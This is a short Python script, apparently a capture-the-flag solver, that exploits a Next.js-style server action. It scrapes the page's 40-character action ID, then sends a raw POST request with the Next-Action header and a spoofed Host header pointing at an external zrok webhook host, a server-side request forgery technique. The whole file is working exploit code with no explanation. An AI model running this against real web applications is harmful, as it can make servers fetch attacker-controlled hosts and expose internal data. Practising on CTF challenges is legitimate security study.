import requests
import re
import socket

def send_raw_http_request(host, port, request):
    with socket.create_connection((host, port)) as sock:
        sock.sendall(request.encode())
        response = b""
        while True:
            data = sock.recv(4096)
            if not data:
                break
            response += data
    return response.decode(errors="ignore")

class Solver:
    def __init__(self, host, port, webhook):
        self.host = host
        self.port = port
        self.webhook = webhook
        self.url = f"http://{host}:{port}"
        pass

    def get_action_id(self):
        r = requests.get(self.url+"").text
        return re.findall(r"[a-f0-9]{40}", r)[0]

    def exploit(self):
        next_action_id = self.get_action_id()

        # r = requests.post(self.url, headers={"next-action": next_action_id, "Host": self.webhook, "origin": self.webhook}).text
        # Example usage:
        request = (
            "POST / HTTP/1.1\r\n"
            f"Host: {self.webhook}\r\n"
            "User-Agent: CustomClient/1.0\r\n"
            f"Next-Action: {next_action_id}\r\n"
            "Content-Length: 2\r\n"
            "Connection: close\r\n"
            "\r\n"
            "{}"
        )

        response = send_raw_http_request(self.host, self.port, request)
        print(response)
        pass

solve = Solver(host="localhost", port=1337, webhook=".share.zrok.io")
solve.exploit()
